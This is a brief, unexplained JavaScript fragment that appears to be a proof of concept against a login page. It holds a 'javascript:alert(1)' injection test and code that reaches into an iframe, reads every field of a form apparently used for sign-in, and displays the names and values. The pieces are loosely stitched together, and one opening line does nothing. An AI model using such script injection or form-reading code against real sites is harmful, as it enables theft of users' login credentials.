document.createElement('div');

javascript:alert(1);
var iframeDocument = frame.contentWindow.document;

var formData = new FormData(iframeDocument.querySelector('form.passport-Domik-Form'))
for (const pair of formData.entries()) {
  alert(`${pair[0]}, ${pair[1]}`);
}
